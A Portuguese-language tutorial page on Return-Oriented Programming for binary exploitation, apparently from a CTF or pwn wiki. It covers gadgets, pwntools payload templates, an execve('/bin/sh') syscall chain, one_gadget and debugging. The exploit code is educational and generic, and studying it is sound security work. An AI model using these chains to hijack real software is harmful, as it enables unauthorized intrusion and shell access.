---
title: ROP (Return-Oriented Programming)
---

Com [NX](../../protections.mdx#nx-no-execute-ou-dep-data-execution-prevention), não dá para executar código injetado. ROP contorna isso reutilizando código que já existe e já é executável: pequenos trechos terminados em `ret`, chamados **gadgets**. Encadeando gadgets, montamos o comportamento que quisermos.

## Como a chain funciona

`ret` é, na prática, `pop rip`: tira 8 bytes do topo da stack e pula para lá. Depois de um Buffer Overflow, controlamos tudo o que está na stack a partir do endereço de retorno. Então:

1. O `ret` da função vulnerável pula para o primeiro endereço que colocamos.
2. Esse trecho executa uma ou duas instruções e termina em `ret`.
3. Esse `ret` desempilha o **próximo** valor da nossa lista e pula para ele.

A stack passa a funcionar como um programa: uma lista de endereços de gadgets, intercalados com os dados que eles consomem. O `rsp` faz o papel de contador de programa.

Exemplo: chamar `puts(minha_string)` em x86-64. O primeiro argumento vai em `rdi`, então precisamos de um gadget `pop rdi; ret`.

```py
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(minha_string)
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])       # continua o programa em vez de crashar
```

O último item é o que torna o ROP componível: a função chamada também termina em `ret`, que consome o próximo endereço da chain. Voltar para a `main` é o truque padrão para explorar a mesma vulnerabilidade uma segunda vez, agora com os endereços vazados (veja [ret2libc](./ret2libc.mdx)).

### Em 32 bits

Argumentos de função vão na stack, então não é preciso gadget para carregá-los. O layout é o que a função espera encontrar ao ser chamada:

```py
payload  = b'A' * offset
payload += p32(elf.plt['puts'])      # função
payload += p32(elf.sym['main'])      # endereço de retorno dela
payload += p32(minha_string)         # 1º argumento
```

Para encadear mais de uma chamada, o "endereço de retorno" precisa ser um gadget que remova os argumentos da stack (`pop ebx; ret` para um argumento, `pop esi; pop edi; ret` para dois).

## Gadgets

| Tipo | Exemplos | Para que serve |
|---|---|---|
| Carregar registrador | `pop rdi; ret`, `pop rsi; pop r15; ret`, `pop rax; ret` | Argumentos de funções e syscalls |
| Só `ret` | `ret` | [Alinhar a stack](../buffer-overflow/return-address.md#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack) antes de chamar a libc |
| Escrever na memória | `mov [rdi], rsi; ret`, `mov qword ptr [rax], rdx; ret` | Gravar `/bin/sh` em uma região gravável |
| Ler da memória | `mov rax, [rdi]; ret` | Carregar valores de ponteiros |
| Aritmética | `add rax, rbx; ret`, `xor eax, eax; ret`, `xchg eax, edi; ret` | Ajustar valores, mover entre registradores |
| Syscall | `syscall; ret`, `int 0x80; ret` | Chamar o kernel direto |
| Mover a stack | `leave; ret`, `pop rsp; ret`, `xchg rsp, rax; ret` | [Stack Pivoting](./stack-pivoting.mdx) |
| Salto indireto | `jmp rax`, `call rax`, `jmp rsp` | Chamar ponteiros, pular para shellcode |

Regras:

- Cada `pop` do gadget consome 8 bytes da chain. Para `pop rsi; pop r15; ret`, coloque dois valores depois do endereço (o segundo pode ser lixo).
- Gadgets não precisam ser instruções "reais" do programa. Como x86 tem instruções de tamanho variável, pular para o meio de uma instrução produz outras. `pop rdi; ret` (`5f c3`) quase sempre vem do final de um `pop r15; ret` (`41 5f c3`).
- **`pop rdx` é raro** em binários pequenos. Opções: gadgets da libc (depois do leak), `ret2csu` em binários compilados com glibc < 2.34, ou [SIGROP](./sigrop.mdx).
- Em binários compilados com glibc ≥ 2.34, a `__libc_csu_init` deixou de existir e até o `pop rdi; ret` pode faltar no binário. O caminho é vazar a libc de outra forma e usar os gadgets dela.

## Encontrando gadgets

```bash
ROPgadget --binary ./vuln | grep "pop rdi"
ROPgadget --binary ./vuln --only "pop|ret"
ropper --file ./vuln --search "pop rdi"
ROPgadget --binary ./libc.so.6 | grep ": pop rdx"      # some a base da libc ao resultado
```

No pwntools:

```py
elf = context.binary = ELF('./vuln')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]    # find_gadget devolve None se não existir
ret     = rop.find_gadget(['ret'])[0]
```

A classe `ROP` também monta a chain inteira, escolhendo os gadgets:

```py
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0])   # alinhamento, se necessário
rop.call('puts', [elf.got['puts']])    # resolve puts@plt e o pop rdi
rop.call('main')
print(rop.dump())                      # mostra a chain, endereço por endereço

payload = b'A' * offset + rop.chain()
```

Com PIE ou gadgets da libc, defina `elf.address`/`libc.address` **antes** de criar o objeto `ROP`, e passe todos os ELFs: `ROP([elf, libc])`.

## ROP com syscall

Em binários estáticos (sem libc dinâmica) há gadgets de sobra, incluindo `syscall`. Uma chain para `execve("/bin/sh", 0, 0)`:

```py
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)     # endereço de uma string "/bin/sh"
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)         # execve
payload += p64(syscall)
```

Se o binário não contém `/bin/sh`, escreva a string em uma região gravável (`.bss`) com um gadget `mov [reg], reg; ret` ou chamando `read(0, bss, 8)` pela própria chain. O `ROPgadget --binary ./vuln --ropchain` tenta gerar essa chain automaticamente.

## one_gadget

A libc contém trechos que executam `execve("/bin/sh", ...)` por conta própria. Pular para um deles abre uma shell sem preparar argumentos, o que é valioso quando só é possível escrever **um** endereço (uma entrada da GOT, um hook, um return address sem espaço para chain).

Saída ilustrativa (os endereços mudam a cada libc):

```bash
$ one_gadget ./libc.so.6
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  ...
```

Cada resultado tem restrições sobre registradores e memória no momento do salto. Teste os candidatos e confira as restrições no GDB.

## Depuração

- Pare no `ret` da função vulnerável (`b *vuln+N`) e avance com `si`: cada `ret` deve cair no gadget seguinte.
- `SIGSEGV` em `movaps` dentro da libc: [alinhamento](../buffer-overflow/return-address.md#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack). Acrescente ou remova um `ret`.
- Chain cortada no meio: algum byte do payload é terminador para a função de leitura (`\n` = `0x0a` em `gets`/`fgets`, espaços em `scanf`, `\0` em `strcpy`). Procure um gadget equivalente em outro endereço.
- A chain não cabe: [Stack Pivoting](./stack-pivoting.mdx).
